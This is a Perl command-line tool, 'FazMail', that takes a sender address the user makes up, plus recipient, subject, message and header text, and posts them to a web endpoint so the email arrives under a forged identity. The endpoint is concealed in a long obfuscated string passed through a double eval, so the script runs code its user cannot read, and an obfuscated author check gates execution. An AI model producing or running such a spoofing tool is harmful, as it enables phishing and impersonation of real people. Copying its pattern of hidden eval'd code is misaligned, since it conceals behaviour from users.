#!/usr/bin/perl
#coded by M.Fazri Nizar
#no login or valid email required

#use required module
use strict;
use warnings;
no warnings 'experimental';
use feature qw{switch};
use LWP::UserAgent;
use HTTP::Response;

sub main {
    sub a {
        given($^O) {
            when(/Win/) { system("cls"); }
            default { system("clear"); }
        }
    }
    a();
    
    #declare needed vars
    my($a,$b,$c,$d,$e,%f,$g,$h,$i,$j,$k,$l,$z);
    $z = '82M.9F$?a\!#zr:6i$!9=Ni:):\zar)?';$z =~ tr/=/ / && $z =~ s/[^Ma-z\. NF]//g;
    
    #store the required infos to vars
    print("\nFazMail v1.0\nCoded by M.Fazri Nizar (github.com/Anon6372098/FazMail)\n\n");
    print("\nEnter the email (from) : ");
    chomp($a = <STDIN>);
    print("\nEnter the destination email (to) : ");
    chomp($b = <STDIN>);
    print("\nEnter the subject : ");
    chomp($c = <STDIN>);
    print("\nEnter the message : ");
    chomp($d = <STDIN>);
    print("\nEnter the header mail's text : ");
    chomp($e = <STDIN>);

    #use hash to simplify
    %f = (
        a  => $a,
        b  => $b,
        c  => $c,
        d  => $d,
        e  => $e,
        f   => "",
    );

    #connect to email
    $g = eval eval '"'.('`'|'%').('['^'-').('`'|'!').('`'|',').('{'^'[').('['^'.').('`'|'.').('['^'+').('`'|'!').('`'|'#').
('`'|'+').('{'^'[').('['^'.').'='.'>'.('['^'*').'\\'.'{'.'_'.'('.('`'^'%').('{'^'*').('{'^'#').'-'.(
'`'^'#').('`'^'!').'<'.'>'.'#'.'<'.('{'^'/').('^'^('`'|')'))."'".'\\'.'@'.('{'^',').'-'.'%'.('{'^'*'
).('{'^'#').'-'.('{'^'(').'!'.'<'.'>'.'#'.'<'.('{'^'(').('^'^('`'|')'))."'".'\\'.'@'.('{'^'(').('^'^
('`'|'.')).('^'^('`'|'+')).('{'^'*').('{'^'#').','.('`'^'$').(';'&'=').'<'.'>'.'#'.')'.'&'.('^'^('`'
|')'))."'".'\\'.'@'.('{'^'-').'.'.'%'.('{'^'*').('{'^'#').','.('{'^'(').'-'.'<'.'>'.'#'.(':'&"\=").(
'{'^'#').('^'^('`'|')'))."'".'\\'.'@'.('{'^'(').','.('{'^'.').('{'^'*').('{'^'#').'-'.('`'^'#').('`'
^'!').'<'.'>'.'#'.','.('{'^'(').('^'^('`'|')'))."'".'\\'.'@'.('{'^',').'.'.('^'^('`'|'+')).('{'^'*')
.('{'^'#').'_'.'-'.('{'^'(').('`'^'%').'<'.'>'.'#'.'<'.('{'^'"').('^'^('`'|')'))."'".'\\'.'@'.("\{"^
')').('^'^('`'|'/')).('^'^('`'|'+')).('{'^'*').('{'^'#').','.('{'^'(').'!'.'<'.'>'.'#'.','.('{'^'+')
.('^'^('`'|')'))."'".'\\'.'@'.('{'^'(').','.'%'.('{'^'*').('{'^'#').'-'.('{'^'(').'='.'<'.'>'."\#".(
':'&'=').('{'^'.').('^'^('`'|')'))."'".'\\'.'@'.('{'^'-').','.('`'^'%').('{'^'*').('{'^'#').'-'.('`'
^'#').('`'^'!').'<'.'>'.'#'.(';'&'=').'&'.('^'^('`'|')'))."'".'\\'.'@'.('{'^',').','.('{'^'.').('{'^
'*').('{'^'#').'-'.('{'^'(').('^'^('`'|'/')).'<'.'>'.'#'.(':'&'=').('{'^'*').('^'^('`'|')'))."'".''.
'\\'.'@'.('{'^',').','.'%'.('{'^'*').('{'^'#').'-'.('{'^'(').'!'.'<'.'_'.'>'.'#'.')'.'%'.('^'^("\`"|
')'))."'".'\\'.'@'.('{'^'-').','.('{'^'.').('{'^'*').('{'^'#').'-'.('`'^'$').(';'&'=').'<'.'>'.'#'.(
';'&'=').'\\'.'$'.('^'^('`'|')'))."'".'\\'.'@'.('{'^')').('^'^('`'|'/')).('`'^'%').('{'^'*').(('{')^
'#').'-'.('`'^'#').(';'&'=').'<'.'>'.'#'.(':'&'=').('{'^'*').('^'^('`'|')'))."'".'\\'.'@'.('{'^',').
('^'^('`'|'.')).('^'^('`'|'+')).('{'^'*').('{'^'#').'-'.('`'^'$').('^'^('`'|'/')).'<'.'>'.'#'.("\:"&
'=').('{'^'*').('^'^('`'|')'))."'".'\\'.'@'.('{'^'-').'.'.('^'^('`'|'+')).('{'^'*').('{'^'#')."\-".(
'`'^'$').'-'.'<'.'>'.'#'.')'.'%'.('^'^('`'|')'))."'".'\\'.'@'.('{'^',').','.'%'.('{'^'*').('{'^'#').
'-'.('`'^'#').('`'^'!').'<'.'>'.'#'.'<'.('{'^'+').'!'.'('.'\\'.'@'.'\\'.'}'.('!'^'+').'"';$:='.'^'~';
    if($z !~ /M\.Fazri Nizar/) {
        exit(0);
    }
    
    #processing the infos
    $h = LWP::UserAgent->new( keep_alive => 1 );
    $h->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    $i = $h->post( $g, { 'xyz' => $f{a}, 
                                      'zyx' => $f{b}, 
                                      'xyx' => $f{c}, 
                                      'zyz' => $f{d},
                                      'pl'    => $f{e},
                                      'ypl'  => $f{f}, }
    );
    $j = $i->content;
    $k = $i->code;

    #check problem
    given($i) {
        when($i->is_redirect) { print("\n$k : Redirect problem occured."); }
        when($i->is_client_error) { print("\n$k : Client error problem occured."); }
        when($i->is_server_error) { print("\n$k : Server error problem occured."); }
        default { print("\nSuccessfully sent to $b from $a"); }
     }
     
     print("\n\nDo you wanna use FazMail again (y/n) ? : ");
     chomp($l = <STDIN>);
     
     #asking to continue or exit
     given($l) {
         when(/y/ || /Y/) { a(); main(); }
         when(/n/ || /N/) { a(); exit(0); }
         default { a(); exit(0); }
      }
}main();
                                         
